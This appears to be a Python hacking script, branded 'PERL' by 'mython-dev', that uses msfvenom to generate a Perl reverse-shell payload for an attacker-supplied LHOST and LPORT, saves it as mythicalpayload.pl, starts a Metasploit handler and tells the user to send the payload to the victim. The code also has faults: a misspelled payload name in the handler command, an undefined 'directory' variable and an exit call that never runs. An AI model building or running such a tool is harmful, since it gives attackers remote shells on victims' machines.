import os
import sys
import socket
from check import *

check_root()
check_os()

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    ip_status = (s.getsockname()[0])
except OSError:
    print('Нет интернета')
    sys.exit

clear()

logo = f'''
d8888b. d88888b d8888b. db      
88  `8D 88'     88  `8D 88      
88oodD' 88ooooo 88oobY' 88      
88~~~   88~~~~~ 88`8b   88      
88      88.     88 `88. 88booo. 
88      Y88888P 88   YD Y88888P 

Code by: mython-dev:)
Instagram: @h4ckerworld or @mython-dev 

'''

def payloads():
    print(logo)
    try:
        print(f'Your LHOST: "{ip_status}"\n')
        lhost = input(f'Enter LHOST: ')
        print(f'Port example: "4444"')
        lport = input(f'Enter lport: ')
    except KeyboardInterrupt:
        print('\nВыход!\n')
        sys.exit()

    # i use payload for perl cmd/unix/reverse_perl

    os.system(f'msfvenom -p cmd/unix/reverse_perl lhost={lhost} lport={lport} -f raw > mythicalpayload.pl')

    print(f'\nSaved payload: {directory}/mythicalpayload.pl\n')

    os.system(f'msfconsole -q -x "use exploit/multi/handler; set payload cmd/unix/reverse_per;  set lhost {lhost} ; set lport {lport} ; run ; "')

    print(f'\nSend the newly created payload to the victim: {directory}/mythicalpayload.pl\n')

payloads()
